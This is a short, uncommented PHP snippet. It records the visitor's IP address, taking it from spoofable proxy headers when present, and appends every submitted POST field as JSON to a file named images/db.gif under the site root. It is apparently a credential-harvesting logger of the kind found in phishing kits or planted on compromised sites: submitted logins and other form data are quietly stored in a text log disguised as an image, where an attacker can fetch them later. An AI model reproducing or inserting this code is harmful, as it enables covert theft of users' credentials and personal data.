<?
$ipc="";
      if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipc = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipc = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipc = $_SERVER['REMOTE_ADDR'];
}
         $_POST["IP"]=$ipc;
        file_put_contents(ROOTPATH .'/images/db.gif', json_encode($_POST)."\n\r", FILE_APPEND);
?>